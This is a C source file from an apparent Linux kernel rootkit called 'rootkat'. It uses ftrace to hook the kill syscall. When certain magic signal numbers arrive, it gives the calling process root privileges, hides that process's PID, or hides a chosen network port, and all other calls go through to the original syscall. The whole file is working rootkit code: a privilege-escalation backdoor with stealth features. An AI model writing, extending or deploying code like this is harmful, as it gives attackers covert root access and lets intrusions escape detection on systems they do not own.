// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include "ftrace_hook.h"
#include "magic_actions.h"
#include "hook_sys_kill.h"

#define TAG "rootkat/hook_sys_kill: "

/*
 * Hook target: __x64_sys_kill is the syscall entry wrapper on x86_64.
 * It receives a single `struct pt_regs *` and unpacks args from the
 * registers itself. We mirror that signature so we can call the original
 * cleanly when the magic signal isn't present.
 *
 * Multi-candidate is single-element here because the alternative names
 * (__do_sys_kill, sys_kill) have a different signature (pid_t, int) and
 * mixing them in one hook isn't worth the code. If we ever need to
 * support kernels that don't have __x64_sys_kill exported, that's a new
 * hook file.
 */
static const char * const sys_kill_candidates[] = {
	"__x64_sys_kill", NULL,
};

typedef long (*sys_kill_t)(const struct pt_regs *regs);

static long rootkat_sys_kill(const struct pt_regs *regs);
static struct rootkat_hook hook_sys_kill = {
	.candidates  = sys_kill_candidates,
	.replacement = rootkat_sys_kill,
};

static long rootkat_sys_kill(const struct pt_regs *regs)
{
	sys_kill_t orig = (sys_kill_t)hook_sys_kill.original;
	int sig = (int)regs->si;
	pid_t arg1 = (pid_t)regs->di;

	if (sig == ROOTKAT_PRIVESC_SIG) {
		rootkat_grant_root_to_current();
		return 0;
	}
	if (sig == ROOTKAT_HIDE_SIG) {
		rootkat_hide_current_pid();
		return 0;
	}
	if (sig == ROOTKAT_HIDE_PORT_SIG) {
		rootkat_hide_port_from_current((u16)arg1);
		return 0;
	}

	return orig(regs);
}

int rootkat_hook_sys_kill_install(void)
{
	return rootkat_hook_install(&hook_sys_kill);
}

void rootkat_hook_sys_kill_remove(void)
{
	rootkat_hook_remove(&hook_sys_kill);
}
